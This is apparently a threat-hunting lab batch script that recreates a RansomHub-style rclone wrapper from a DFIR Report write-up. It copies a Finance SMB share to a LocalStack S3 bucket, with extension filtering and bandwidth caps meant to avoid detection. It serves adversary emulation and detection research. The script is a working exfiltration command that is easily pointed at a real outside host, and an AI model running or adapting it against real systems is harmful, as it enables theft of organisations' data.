@echo off
REM rcl.bat
REM Hunt Lab recreation of the rclone wrapper from The DFIR Report
REM "Hide Your RDP: Password Spray Leads to RansomHub Deployment" (2025-06).
REM
REM Original report: rclone copied a target SMB share to a remote SFTP server,
REM filtered by a hand-picked file extension list, with --max-age and bandwidth
REM caps to avoid noisy bursts.
REM
REM Lab swap: target = LocalStack S3 (s3://ransomhub-exfil-lab) on the docker
REM host. No real off-network egress.

set RCLONE=C:\Users\Public\rclone.exe
set INCLUDE=C:\Users\Public\include.txt
set SOURCE=\\win-server\Finance
set REMOTE=hunt-lab-s3:ransomhub-exfil-lab/finance/

REM rclone S3 config is passed inline so we don't have to drop a config file.
"%RCLONE%" copy "%SOURCE%" "%REMOTE%" ^
    --include-from "%INCLUDE%" ^
    --max-age 30d ^
    --transfers 4 ^
    --multi-thread-streams 4 ^
    --bwlimit 8M ^
    --s3-provider Other ^
    --s3-endpoint http://192.168.56.10:4566 ^
    --s3-access-key-id test ^
    --s3-secret-access-key test ^
    --s3-region us-east-1 ^
    --s3-force-path-style true ^
    --s3-no-check-bucket ^
    --log-file C:\Users\Public\rcl.log ^
    --log-level INFO
